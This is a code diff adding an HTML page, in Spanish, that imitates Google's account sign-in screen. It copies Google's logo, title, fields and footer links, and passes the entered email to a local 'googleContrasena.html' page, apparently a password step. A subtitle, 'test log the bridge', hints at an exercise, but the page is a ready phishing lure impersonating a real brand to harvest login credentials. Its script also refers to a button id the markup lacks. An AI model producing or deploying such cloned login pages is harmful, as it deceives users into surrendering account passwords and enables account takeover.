@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <link rel="icon" href="logogoogle.png" type="image/png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"> <!-- agregado -->
+  <title>Iniciar sesión: Cuentas de Google</title>
+  <link rel="stylesheet" href="stylesGoogle.css" />
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+
+</head>
+<body>
+
+<div class="container">
+  <div class="header">
+    <img src="logogoogle.png" alt="Google">
+    <span>Iniciar sesión con Google</span>
+  </div>
+  <div class="card">
+    <div class="left-side">
+      <div class="title">Inicia sesión</div>
+      <div class="subtitle">
+        <span style="color: #202124;">Ir a</span>
+        <span style="color: #0b57cf;"> test log the bridge</span>
+      </div>
+    </div>
+
+    <div class="right-side">
+      <form action="googleContrasena.html" method="GET">
+        <div class="input-group">
+          <input type="email" name="email" id="email" placeholder=" " required>
+          <label for="email">Correo electrónico o teléfono</label>
+        </div>
+        <a class="forgot" href="#">¿Has olvidado tu correo electrónico?</a>
+
+        <!-- resto de botones y enlaces -->
+        <div class="actions">
+          <a class="create" href="#">Crear cuenta</a>
+          <button class="next-btn" type="submit">Siguiente</button>
+        </div>
+      </form>
+
+    </div>
+  </div>
+</div>
+<footer class="footer">
+  <div class="footer-left">
+    <span>Español (España)</span>
+  </div>
+  <div class="footer-right">
+    <a href="#">Ayuda</a>
+    <a href="#">Privacidad</a>
+    <a href="#">Términos</a>
+  </div>
+</footer>
+
+</body>
+<script>
+  document.getElementById('nextBtn').addEventListener('click', function() {
+    window.location.href = 'googleContrasena.html';
+  });
+</script>
+</html>
+
+
+
